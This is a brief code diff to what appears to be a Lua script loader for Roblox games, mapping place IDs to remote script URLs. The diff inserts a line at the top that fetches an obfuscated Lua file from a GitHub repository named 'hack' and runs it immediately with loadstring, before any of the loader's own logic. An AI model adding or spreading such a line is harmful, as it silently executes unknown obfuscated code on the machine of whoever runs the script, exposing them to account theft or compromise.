@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/vinh129150/hack/refs/heads/main/Obfuscated.lua"))()
+
 local place = tostring(game.PlaceId)
 local scripts = {
     ["121864768012064"] = "https://pandadevelopment.net/virtual/file/bace1afeed77bc02",
